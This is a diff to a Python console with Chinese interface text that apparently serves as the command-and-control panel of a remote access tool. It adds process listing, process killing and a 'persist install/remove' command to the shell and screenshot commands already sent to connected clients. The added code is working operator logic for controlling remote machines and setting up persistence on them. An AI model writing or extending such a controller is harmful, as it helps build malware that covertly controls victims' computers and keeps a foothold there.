@@ -227,6 +227,9 @@ def print_help():
     print(f"  {YELLOW}file <路径>{RESET}       {LGREEN}查看类型{RESET}")
     print(f"  {YELLOW}find <模式> [-t]{RESET}  {LGREEN}查找{RESET}")
     print(f"  {YELLOW}shell <命令>{RESET}      {LGREEN}执行命令{RESET}")
+    print(f"  {YELLOW}ps{RESET}                {LGREEN}查看进程{RESET}")
+    print(f"  {YELLOW}kill <PID>{RESET}        {LGREEN}终止进程{RESET}")
+    print(f"  {YELLOW}persist <action>{RESET}   {LGREEN}持久化管理{RESET}")
     print(f"  {YELLOW}screenshot{RESET}         {LGREEN}截图{RESET}")
     print(f"  {YELLOW}help{RESET}              {LGREEN}显示帮助{RESET}")
     print(f"  {YELLOW}back{RESET}              {LGREEN}返回{RESET}")
@@ -489,6 +492,54 @@ def interaction_loop(client_id, hostname):
                         print(f"{DCYAN}{output}{RESET}")
                     else:
                         print_failed_result(r)
+        elif cmd in ("ps", "process"):
+            send_command(client_id, "ps")
+            results = wait_for_result(client_id, timeout=5.0)
+            if results:
+                for r in results:
+                    if r.get("result_type") == "process_list":
+                        processes = r.get("result", [])
+                        print(f"\n{YELLOW}PID{RESET}    {YELLOW}NAME{RESET}{' ' * 20} {YELLOW}USERNAME{RESET}")
+                        print("-" * 60)
+                        for proc in processes:
+                            pid = proc.get('pid', 'N/A') if isinstance(proc, dict) else 'N/A'
+                            name = proc.get('name', 'N/A')[:20] if isinstance(proc, dict) else 'N/A' # 限制进程名长度
+                            username = proc.get('username', 'N/A') if isinstance(proc, dict) else 'N/A'
+                            status = proc.get('status', '') if isinstance(proc, dict) else ''
+                            print(f"{CYAN}{pid:<8}{RESET} {name:<22} {username:<15}")
+                        print(f"\n{LGREEN}[结果]{RESET} Found {len(processes)} processes\n")
+                    else:
+                        print_failed_result(r)
+        elif cmd in ("kill", "terminate"):
+            if not arg:
+                print(f"{RED}[错误]{RESET} 用法: kill <PID>")
+                continue
+            try:
+                pid = int(arg)
+                send_command(client_id, "kill", {"pid": pid})
+                results = wait_for_result(client_id)
+                if results:
+                    for r in results:
+                        print_failed_result(r)
+            except ValueError:
+                print(f"{RED}[错误]{RESET} PID必须是有效整数")
+        elif cmd in ("persist", "install"):
+            if not arg:
+                print(f"{RED}[错误]{RESET} 用法: persist <install|remove> [参数]")
+                continue
+            parts = arg.split(maxsplit=1)
+            action = parts[0].lower()
+            param = parts[1] if len(parts) > 1 else ""
+            
+            payload = {"action": action}
+            if action == "install" and param:
+                payload["path"] = param
+            
+            send_command(client_id, "persist", payload)
+            results = wait_for_result(client_id)
+            if results:
+                for r in results:
+                    print_failed_result(r)
         elif cmd == "help":
             print_help()
         else:
